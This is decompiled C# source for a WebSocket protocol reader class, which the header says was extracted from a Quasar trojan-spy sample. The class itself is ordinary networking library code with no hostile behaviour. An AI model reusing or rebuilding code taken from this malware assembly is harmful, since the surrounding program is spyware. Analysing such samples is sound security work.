// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.WebSocket4Net.Protocol.ReaderBase
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.WebSocket4Net.Common;

namespace NoiseMe.Drags.App.Models.WebSocket4Net.Protocol
{
  public abstract class ReaderBase : IClientCommandReader<WebSocketCommandInfo>
  {
    private readonly ArraySegmentList m_BufferSegments;

    protected WebSocket WebSocket { get; private set; }

    public ReaderBase(WebSocket websocket)
    {
      this.WebSocket = websocket;
      this.m_BufferSegments = new ArraySegmentList();
    }

    protected ArraySegmentList BufferSegments => this.m_BufferSegments;

    public ReaderBase(ReaderBase previousCommandReader) => this.m_BufferSegments = previousCommandReader.BufferSegments;

    public abstract WebSocketCommandInfo GetCommandInfo(
      byte[] readBuffer,
      int offset,
      int length,
      out int left);

    public IClientCommandReader<WebSocketCommandInfo> NextCommandReader { get; set; }

    protected void AddArraySegment(byte[] buffer, int offset, int length) => this.BufferSegments.AddSegment(buffer, offset, length, true);

    protected void ClearBufferSegments() => this.BufferSegments.ClearSegements();
  }
}
